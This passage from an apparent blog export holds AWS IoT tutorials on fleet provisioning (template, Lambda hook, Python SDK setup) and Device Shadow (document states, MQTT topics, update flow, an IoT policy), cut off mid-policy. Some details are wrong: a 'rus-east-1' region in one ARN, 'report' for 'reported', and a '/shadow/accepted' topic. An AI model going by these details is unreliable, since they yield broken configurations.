<span class="string">&quot;AWS::IoT::Thing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">                    <span class="attr">&quot;version&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;serialNumber&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;serialNumber&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ThingName&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Fn::Join&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="punctuation">[</span><span class="string">&quot;ThingPrefix_&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;SerialNumber&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;v1-lightbulbs&quot;</span><span class="punctuation">,</span> <span class="string">&quot;WA&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;BillingGroup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LightBulbBillingGroup&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OverrideSettings&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;MERGE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;REPLACE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;DO_NOTHING&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;certificate&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;CertificateId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate::Id&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Active&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;policy&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;PolicyDocument&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:iot:us-east-1:123456789012:topic/foo/bar&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DeviceConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;FallbackUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.example.com/test-site&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Fn::FindInMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;LocationTable&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DeviceLocation&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="string">&quot;LocationUrl&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>The pre-provisioning hook is a Lambda function that validates the parameters passed from the device before provisioning. This Lambda function must exist in your account to provision devices.</p><p>This part is set up to perform actions before configuring devices. For example, check devices against a known device database to prevent unauthorized devices from connecting to your account.</p><p><img src="https://i.imgur.com/pL1yTCM.png" alt="Imgur"></p><ul><li>Choose <strong>Create a Lambda function</strong></li></ul><h3 id="Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate"><a href="#Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate" class="headerlink" title="Sample provisioning hook where you validate the request before activating a certificate"></a>Sample provisioning hook where you validate the request before activating a certificate</h3><blockquote><p>Github: <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate">https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"></span><br><span class="line">provision_response = &#123;</span><br><span class="line">    <span class="string">&#x27;allowProvisioning&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">&quot;parameterOverrides&quot;</span>: &#123;<span class="string">&quot;CertDate&quot;</span>: date.today().strftime(<span class="string">&quot;%m/%d/%y&quot;</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">########################</span></span><br><span class="line">    <span class="comment">## Stringent validation against internal API&#x27;s/DB etc to validate the request before proceeding</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment">## if event[&#x27;parameters&#x27;][&#x27;SerialNumber&#x27;] = &quot;approved by company CSO&quot;:</span></span><br><span class="line">    <span class="comment">##     provision_response[&quot;allowProvisioning&quot;] = True</span></span><br><span class="line">    <span class="comment">#####################</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> provision_response</span><br></pre></td></tr></table></figure><h3 id="Hook-Input"><a href="#Hook-Input" class="headerlink" title="Hook Input"></a>Hook Input</h3><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;claimCertificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificatePem&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;templateArn&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;arn:aws:iot:us-east-1:XXXXXXXXXXXX:provisioningtemplate/MyTemplate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clientId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;221a6d10-9c7f-42f1-9153-e52e6fc869c1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>When registering a device with AWS IoT, this object is sent to the Lambda function by AWS IoT.</p><p>The <code>parameters</code> object passed to the Lambda function contains attributes from the parameters argument passed in the <strong>RegisterThing</strong> request payload.</p><h2 id="Configuration-Device-Side"><a href="#Configuration-Device-Side" class="headerlink" title="Configuration - Device Side"></a>Configuration - Device Side</h2><p>The downloaded Claim certificate and private key need to be moved to the device.</p><p>You can use commands like <code>scp</code> to copy files from your local machine to your device via SSH.</p><p>Additionally, you will need to install the desired <strong>IoT Device SDK</strong> on the device.</p><blockquote><p>AWS IoT Device SDKs, Mobile SDKs, and AWS IoT Device Client -  - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html</a></p></blockquote><p>Currently, Device SDK supports writing code in C++, javascript, Java, Python, Embedded-C languages, depending on your requirements and scenarios.</p><h3 id="Using-AWS-IoT-Device-SDK"><a href="#Using-AWS-IoT-Device-SDK" class="headerlink" title="Using AWS IoT Device SDK"></a>Using AWS IoT Device SDK</h3><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2">https://github.com/aws/aws-iot-device-sdk-python-v2</a></p></blockquote><p>This article mainly uses the <strong>Python IoT Device SDKv2</strong>.</p><p>To install the SDK on the device, first ensure that the device has <code>git</code>, <code>Python3</code>, and <code>Python3-pip</code> packages.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><p>Initialize the package</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#  (Optional) Setup the version number of your local build. The default version </span><br><span class="line">#    for awsiotsdk is set to &quot;1.0.0-dev&quot;, you can set the version number of the</span><br><span class="line">#    local build in &quot;aws-iot-device-sdk-python-v2/awsiot/__init__.py&quot;</span><br><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br><span class="line"></span><br><span class="line">#  Install using Pip (use &#x27;python&#x27; instead of &#x27;python3&#x27; on Windows)</span><br><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>In <code>aws-iot-device-sdk-python-v2/samples/fleetprovisioning.py</code> , you can set up the Provisioning Template.</p><p>Afterwards, you need to specify on your device:</p><p>AWS IoT Endpoint<br>Claim Certificate<br>Private Key<br>to connect to AWS IoT Core.<br>You can find the script’s operating steps here:</p><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md">https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fleetprovisioning.py --endpoint &lt;endpoint&gt; --cert &lt;file&gt; --key &lt;file&gt; --template_name &lt;name&gt; --template_parameters &#x27;&#123;\&quot;SerialNumber\&quot;:\&quot;1\&quot;,\&quot;DeviceLocation\&quot;:\&quot;Seattle\&quot;&#125;&#x27; --csr &lt;path to csr file&gt;</span><br></pre></td></tr></table></figure><h2 id="Reference-Documents"><a href="#Reference-Documents" class="headerlink" title="Reference Documents"></a>Reference Documents</h2><p>[+] <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning">https://github.com/aws-samples/aws-iot-fleet-provisioning</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based</a><br>[+] <a href="https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/">https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/</a></p>]]></content>
      
      
      <categories>
          
          <category> Hands-On Practices </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> Device Provisioning </tag>
            
            <tag> Certificate </tag>
            
            <tag> Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: AWS IoT Device Shadow</title>
      <link href="/en/posts/aws-iot-device-shadow.html"/>
      <url>/en/posts/aws-iot-device-shadow.html</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-What-is-AWS-IoT-Device-Shadow"><a href="#Intro-What-is-AWS-IoT-Device-Shadow" class="headerlink" title="Intro - What is AWS IoT Device Shadow?"></a>Intro - What is AWS IoT Device Shadow?</h1><p>In real world, sometime it is difficult to get the actual device state in real time in such IoT scenarios.</p><p>A device shadow can overcome this challenge, Device Shadow can consider a virtual  virtual representation of a device which managed by the <strong>IoT Things</strong> resource created in AWS IoT Core.</p><blockquote><p>The Shadow document is a JSON or a JavaScript notation doc that is used to store and retrieve the current state information for a device. You can use the shadow to get and set the state of a device over MQTT topics or HTTP REST APIs, regardless of whether the device is connected to the internet.</p></blockquote><h1 id="Shadow-Document"><a href="#Shadow-Document" class="headerlink" title="Shadow Document"></a>Shadow Document</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Refer to the json above, you can check there 3 <strong>state</strong> properties in shadow document.</p><ul><li>desired<ul><li>Apps specify the desired states of device properties by updating the desired object</li></ul></li><li>reported<ul><li>Devices report their current state in the reported object.</li></ul></li><li>delta<ul><li>AWS IoT reports differences between the desired and the reported state in the delta object.</li></ul></li></ul><blockquote><p>You can consider the flow of Shadow a finite state machine, for AWS IoT Core, it will also check if there are delta event, that means there difference between <strong>Desired</strong> and <strong>Reported</strong> states</p></blockquote><p>So how can we update the state of a shadow?  The answer is clear,</p><blockquote><p><strong>By subscribing&#x2F;publishing messages to the certain MQTT topics</strong></p></blockquote><h1 id="Shadow-Topic"><a href="#Shadow-Topic" class="headerlink" title="Shadow Topic"></a>Shadow Topic</h1><table><thead><tr><th>ShadowTopicPrefix value</th><th>Shadow type</th></tr></thead><tbody><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow</td><td>Unnamed (classic) shadow</td></tr><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow&#x2F;name&#x2F;shadowName</td><td>Named shadow</td></tr></tbody></table><table><thead><tr><th>Topic</th><th>Client operations allowed</th></tr></thead><tbody><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;accepted</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;delta</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;documents</td><td>Subscribe</td></tr></tbody></table><blockquote><p>For detail explanation about these shadow topics, see the documentation - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html</a></p></blockquote><h1 id="The-state-changes-of-Device-Shadow"><a href="#The-state-changes-of-Device-Shadow" class="headerlink" title="The state changes of Device Shadow"></a>The state changes of Device Shadow</h1><p><img src="https://i.imgur.com/l071JEc.png" alt="Imgur"></p><p>Take this picture for example, the update flow is:</p><ol><li>The MQTT client publishes a <code>$aws/things/myLightBulb/shadow/update</code> message to the server. The message carries the desired state <code>&#123;&quot;state&quot;: &#123;&quot;desired&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code></li><li>IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code>, indicating that the update message has been received. At the same time, it publishes <code>$aws/things/myLightBulb/shadow/delta</code> to notify the device to update, and then publishes <code>$aws/things/myLightBulb/shadow/update/document</code> as update record</li><li>After receiving the message, the Device performs the corresponding update operation and publishes a message <code>$aws/things/myLightBulb/shadow/update</code> <code>&#123;&quot;state&quot;&#123;&quot;report&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code> to the IoT Server after completion. Notification updated</li><li>After receiving the post-update message, IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code> to indicate that the update message has been received. Publish another <code>$aws/things/myLightBulb/shadow/update/document</code> as an update record</li></ol><h1 id="Expermient-for-IoT-Shadow"><a href="#Expermient-for-IoT-Shadow" class="headerlink" title="Expermient for IoT Shadow"></a>Expermient for IoT Shadow</h1><h2 id="Device-Setup"><a href="#Device-Setup" class="headerlink" title="Device Setup"></a>Device Setup</h2><p>Since I don’t have any IoT Device currently available, I simulate the device by launching a EC2 instance.</p><ul><li>AMI: <code>Ubuntu 22 LTS</code></li><li>Type: <code>t2.Micro</code></li><li>Subnet: <code>10.1.0.0/24</code></li></ul><p>Then connect to the EC2 instance by using SSH, and run the following command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y python3-pip</span><br><span class="line">mkdir certs/</span><br></pre></td></tr></table></figure><h2 id="Setup-in-AWS-IoT-Core"><a href="#Setup-in-AWS-IoT-Core" class="headerlink" title="Setup in AWS IoT Core"></a>Setup in AWS IoT Core</h2><p>There are 3 things to setup in AWS IoT Core</p><ul><li>Create certificate</li><li>Create IoT Policy and associated with the certificate</li><li>Create Things object and associate with the certificate</li></ul><h3 id="Things"><a href="#Things" class="headerlink" title="Things"></a>Things</h3><p>This is a thing named <code>ESP32</code> for testing purposes, it have associated with the certificate</p><p><img src="https://i.imgur.com/96y4cVz.png" alt="Imgur"></p><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h3><p>And this certificate has issued by the Amazon Root CA.</p><p><img src="https://i.imgur.com/Hg9Jzsv.png" alt="Imgur"></p><p>And there are IoT Policy - <code>TestPolicy</code> asccociate with this certificate.</p><p><em>TestPolicy</em></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:rus-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span 